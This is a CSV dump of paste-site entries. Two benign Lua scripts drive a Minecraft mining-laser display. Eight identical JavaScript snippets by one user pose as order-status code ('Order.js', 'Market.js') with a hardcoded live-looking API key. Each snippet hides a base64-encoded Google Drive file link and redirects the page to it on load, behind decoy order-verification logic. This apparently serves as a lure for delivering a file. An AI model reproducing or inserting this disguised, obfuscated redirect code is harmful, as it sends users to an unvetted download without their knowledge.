id,title,username,language,date,content
n0ZbhLnB,Order.js,jm33,JavaScript,Tuesday 22nd of April 2025 01:43:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55249/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
h3G5GBB2,Market.js,jm33,JavaScript,Tuesday 22nd of April 2025 01:27:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67699/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xXmBnpKm,Untitled,jm33,JavaScript,Tuesday 22nd of April 2025 01:12:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83409/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GuacDR3a,Products.js,jm33,JavaScript,Tuesday 22nd of April 2025 12:56:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29225/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bgaCLstQ,Order.js,jm33,JavaScript,Tuesday 22nd of April 2025 12:41:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11162/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ASpBZdgN,Market.js,jm33,JavaScript,Tuesday 22nd of April 2025 12:26:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39513/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PUy0adWE,激光扫描发射器 水平采矿 投屏 v2,jaklsfjlsak,Lua,Tuesday 22nd of April 2025 12:16:21 AM CDT,"-- Laser‑Guided Warp System (“ztc”) with H/I/O prompts and O‑key to run otc

-- 1) Wrap terminal + any attached monitors
local screens = {}

-- Terminal wrapper
table.insert(screens, {
  clear              = function() term.clear(); term.setCursorPos(1,1) end,
  getSize            = function() return term.getSize() end,
  setTextColor       = term.setTextColor,
  setBackgroundColor = term.setBackgroundColor,
  setCursorPos       = term.setCursorPos,
  write              = term.write,
})

-- Monitor wrappers
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""monitor"" then
    local m = peripheral.wrap(side)
    table.insert(screens, {
      clear              = function() m.clear(); m.setCursorPos(1,1) end,
      getSize            = function() return m.getSize() end,
      setTextColor       = function(c) m.setTextColor(c) end,
      setBackgroundColor = function(c) m.setBackgroundColor(c) end,
      setCursorPos       = function(x,y) m.setCursorPos(x,y) end,
      write              = function(txt) m.write(txt) end,
      monitor            = m,
    })
  end
end

-- 2) Auto‑scale monitors so at least 7 lines will fit
for _, s in ipairs(screens) do
  if s.monitor then
    local best = 0.5
    for _, scale in ipairs({1, 0.5}) do
      s.monitor.setTextScale(scale)
      local w,h = s.getSize()
      if w >= 40 and h >= 7 then
        best = scale
        break
      end
    end
    s.monitor.setTextScale(best)
  end
end

-- 3) Helpers
local function forAll(fn) for _,s in ipairs(screens) do fn(s) end end

-- Clear every screen to lightGray
local function clearAll()
  forAll(function(s)
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.clear()
  end)
end

-- 4) Static texts
local titleText     = ""Horizontal Mining System""
local subtitleText  = ""Emit Scanning Laser to Mine Target""
local offsetText    = ""Horizontal Miner ( L ): ""
local promptH       = ""Press H for Main Menu""
local promptI       = ""Press C to Configure Miner""
local promptO       = ""Press L to Toggle Miner""

-- Draw title, subtitle, and offset‑state line (now on line 5)
local function drawStatic()
  forAll(function(s)
    local w,_ = s.getSize()
    -- Title (line 1): white on black
    local xT = math.floor((w - #titleText)/2) + 1
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.black)
    s.setCursorPos(xT,1)
    s.write(titleText)

    -- Subtitle (line 3): black on lightGray
    local xS = math.floor((w - #subtitleText)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(xS,3)
    s.write(subtitleText)

    -- (line 4 is intentionally left blank)

    -- Mining Laser Offset (line 5)
    local fullOffset = offsetText .. ""OFF""
    local xO = math.floor((w - #fullOffset)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,5)
    s.write(string.rep("" "", w))
    s.setCursorPos(xO,5)
    s.write(offsetText)
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.red)
    s.write(""OFF"")
  end)
end

-- Draw prompts on the bottom three rows
local function drawPrompt()
  forAll(function(s)
    local w,h = s.getSize()
    -- line h-2: O prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-2)
    s.write(string.rep("" "", w))
    local xO = math.floor((w - #promptO)/2) + 1
    s.setCursorPos(xO,h-2)
    s.write(promptO)
    -- line h-1: H prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-1)
    s.write(string.rep("" "", w))
    local xH = math.floor((w - #promptH)/2) + 1
    s.setCursorPos(xH,h-1)
    s.write(promptH)
    -- line h: I prompt
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h)
    s.write(string.rep("" "", w))
    local xI = math.floor((w - #promptI)/2) + 1
    s.setCursorPos(xI,h)
    s.write(promptI)
  end)
end

-- 5) Set up warpdriveLaserCamera peripherals
rednet.open(""top"")
local cams = peripheral.getNames()
for i=#cams,1,-1 do
  if peripheral.getType(cams[i]) ~= ""warpdriveLaserCamera"" then
    table.remove(cams,i)
  else
    peripheral.wrap(cams[i]).beamFrequency(1420)
  end
end

-- 6) Initial draw (blank coords)
clearAll()
drawStatic()
drawPrompt()

-- 7) Coords line, accepts nil → blanks before first scan (on line 6)
local function updateCoords(x,y,z)
  local sx = x and tostring(x) or ""    ""
  local sy = y and tostring(y) or ""    ""
  local sz = z and tostring(z) or ""    ""
  local coordLine = string.format(""Target: X:%s   Y:%s   Z:%s"", sx, sy, sz)
  forAll(function(s)
    local w,_ = s.getSize()
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,6)
    s.write(string.rep("" "", w))
    local cx = math.floor((w - #coordLine)/2) + 1
    s.setCursorPos(cx,6)
    s.write(coordLine)
  end)
end

-- draw initial blanks (on line 6)
updateCoords(nil,nil,nil)

-- 8) Main loop: scan + key handling
while true do
  local ev,k,b,c,d = os.pullEventRaw()
  if ev == ""laserScanning"" then
    local tx = tonumber(b)
    local ty = tonumber(c)
    local tz = tonumber(d)
    updateCoords(tx,ty,tz)
    local data = { x = tx, y = ty, z = tz }
    rednet.broadcast(data, ""SMineBroadcast"")

  elseif ev == ""key"" then
    if k == keys.h then
      os.reboot()
    elseif k == keys.c then
      shell.run(""conf"")
      clearAll(); drawStatic(); updateCoords(tx,ty,tz); drawPrompt()
    elseif k == keys.l then
      rednet.broadcast(""Toggle"", ""Miner"")
    end
  end
end
"
pMsVVUFQ,Untitled,jm33,JavaScript,Tuesday 22nd of April 2025 12:10:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46382/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bKwtUXX0,Products.js,jm33,JavaScript,Monday 21st of April 2025 11:55:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BpEAj3Zj,激光扫描发射器 水平采矿 投屏,jaklsfjlsak,Lua,Monday 21st of April 2025 11:47:10 PM CDT,"-- Laser‑Guided Warp System (“ztc”) with H/I/O prompts and O‑key to run otc

-- 1) Wrap terminal + any attached monitors
local screens = {}

-- Terminal wrapper
table.insert(screens, {
  clear              = function() term.clear(); term.setCursorPos(1,1) end,
  getSize            = function() return term.getSize() end,
  setTextColor       = term.setTextColor,
  setBackgroundColor = term.setBackgroundColor,
  setCursorPos       = term.setCursorPos,
  write              = term.write,
})

-- Monitor wrappers
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""monitor"" then
    local m = peripheral.wrap(side)
    table.insert(screens, {
      clear              = function() m.clear(); m.setCursorPos(1,1) end,
      getSize            = function() return m.getSize() end,
      setTextColor       = function(c) m.setTextColor(c) end,
      setBackgroundColor = function(c) m.setBackgroundColor(c) end,
      setCursorPos       = function(x,y) m.setCursorPos(x,y) end,
      write              = function(txt) m.write(txt) end,
      monitor            = m,
    })
  end
end

-- 2) Auto‑scale monitors so at least 7 lines will fit
for _, s in ipairs(screens) do
  if s.monitor then
    local best = 0.5
    for _, scale in ipairs({1, 0.5}) do
      s.monitor.setTextScale(scale)
      local w,h = s.getSize()
      if w >= 40 and h >= 7 then
        best = scale
        break
      end
    end
    s.monitor.setTextScale(best)
  end
end

-- 3) Helpers
local function forAll(fn) for _,s in ipairs(screens) do fn(s) end end

-- Clear every screen to lightGray
local function clearAll()
  forAll(function(s)
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.clear()
  end)
end

-- 4) Static texts
local titleText     = ""Horizontal Mining System""
local subtitleText  = ""Emit Scanning Laser to Mine Target""
local offsetText    = ""Horizontal Miner ( L ): ""
local promptH       = ""Press H for Main Menu""
local promptI       = ""Press C to Configure Miner""
local promptO       = ""Press L to Toggle Miner""

-- Draw title, subtitle, offset‑state and proximity‑state lines
local function drawStatic()
  forAll(function(s)
    local w,_ = s.getSize()
    -- Title (line 1): white on black
    local xT = math.floor((w - #titleText)/2) + 1
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.black)
    s.setCursorPos(xT,1)
    s.write(titleText)

    -- Subtitle (line 3): black on lightGray
    local xS = math.floor((w - #subtitleText)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(xS,3)
    s.write(subtitleText)

    -- Mining Laser Offset (line 4)
    local fullOffset = offsetText..""OFF""
    local xO = math.floor((w - #fullOffset)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,4)
    s.write(string.rep("" "", w))
    s.setCursorPos(xO,4)
    s.write(offsetText)
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.red)
    s.write(""OFF"")

  end)
end

-- Draw prompts on the bottom three rows
local function drawPrompt()
  forAll(function(s)
    local w,h = s.getSize()
    -- line h-2: O prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-2)
    s.write(string.rep("" "", w))
    local xO = math.floor((w - #promptO)/2) + 1
    s.setCursorPos(xO,h-2)
    s.write(promptO)
    -- line h-1: H prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-1)
    s.write(string.rep("" "", w))
    local xH = math.floor((w - #promptH)/2) + 1
    s.setCursorPos(xH,h-1)
    s.write(promptH)
    -- line h: I prompt
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h)
    s.write(string.rep("" "", w))
    local xI = math.floor((w - #promptI)/2) + 1
    s.setCursorPos(xI,h)
    s.write(promptI)
  end)
end

-- 5) Set up warpdriveLaserCamera peripherals
rednet.open(""top"")
local cams = peripheral.getNames()
for i=#cams,1,-1 do
  if peripheral.getType(cams[i]) ~= ""warpdriveLaserCamera"" then
    table.remove(cams,i)
  else
    peripheral.wrap(cams[i]).beamFrequency(1420)
  end
end

-- 6) Initial draw (blank coords)
clearAll()
drawStatic()
drawPrompt()

-- 7) Coords line, accepts nil → blanks before first scan
local function updateCoords(x,y,z)
  local sx = x and tostring(x) or ""    ""
  local sy = y and tostring(y) or ""    ""
  local sz = z and tostring(z) or ""    ""
  local coordLine = string.format(""Target: X:%s   Y:%s   Z:%s"", sx, sy, sz)
  forAll(function(s)
    local w,_ = s.getSize()
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,6)
    s.write(string.rep("" "", w))
    local cx = math.floor((w - #coordLine)/2) + 1
    s.setCursorPos(cx,6)
    s.write(coordLine)
  end)
end

-- draw initial blanks (on line 6)
updateCoords(nil,nil,nil)

-- 8) Main loop: scan + key handling
while true do
  local ev,k,b,c,d = os.pullEventRaw()
  if ev == ""laserScanning"" then
    local tx = tonumber(b)
    local ty = tonumber(c)
    local tz = tonumber(d)
    updateCoords(tx,ty,tz)
local data = { x = tx, y = ty, z = tz }
    rednet.broadcast(data, ""SMineBroadcast"")

  elseif ev == ""key"" then
    if k == keys.h then
      os.reboot()
    elseif k == keys.c then
      shell.run(""conf"")
      clearAll(); drawStatic(); updateCoords(tx,ty,tz); drawPrompt()
    elseif k == keys.l then
      rednet.broadcast(""Toggle"", ""Miner"")
    end
  end
end
"
q6pYfkd1,Order.js,jm33,JavaScript,Monday 21st of April 2025 11:39:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05324/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
